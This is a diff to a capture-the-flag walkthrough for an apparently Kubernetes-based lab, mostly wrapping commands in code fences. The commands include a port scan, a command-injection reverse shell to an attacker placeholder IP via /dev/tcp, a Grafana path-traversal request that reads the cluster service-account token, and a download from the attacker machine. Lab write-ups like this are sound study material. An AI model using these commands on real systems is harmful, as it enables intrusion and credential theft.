@@ -3,7 +3,9 @@
 
 ### Task 1
 
+```
 nmap -p- -Pn -sC -sT -A --reason -o nmap.scan [Target IP]
+```
 This will give us answer rot the first question.
 
 
@@ -16,7 +18,9 @@ Author tells us that flag is in Envrometal variable so lets  type ;printenv
 We have to establish reverse shell with target machine in order to complete further task
 There is no netcat or python avaliable on machine for us to use. 
 We have to use Command injection attack again
+```
 127.0.0.1 && bash &>/dev/tcp/[Attacker IP]/[PORT] <&1
+```
 
 ### Task 3
 
@@ -32,13 +36,16 @@ Flag is there, you can analyse it with online tools
 Running env you will see there is a Grafana service running in the cluster.
 We need to find what version of Grafana is used and search for vulnerabilities
 Still in console that is connected to the target machine
-curl http://grafana:3000/login/ - Text is long but it is easy to find ;)
+```curl http://grafana:3000/login/```
+Text is long but answer is easy to find ;)
  
 
 ### Task 6
 
 I had trouble with running exploit but when googling around I have found solution
+```
 curl --path-as-is http://grafana:3000/public/plugins/alertlist/../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
+```
 Now we have token
 To get service account name we can use option "get serviceaccount" and token that we have found
 To get next two answers all we need to do is fllow instruction. Flag 3 is in same place as flag 1
@@ -79,6 +86,7 @@ spec:
  
 To get file into TARGET machine lets start ftp server on our machine
 then simply curl http://ATTACKER IP:PORT/file.yaml
-to get last flag use find / -type f -name root.txt
+to get last flag use 
+```find / -type f -name root.txt```
    
 
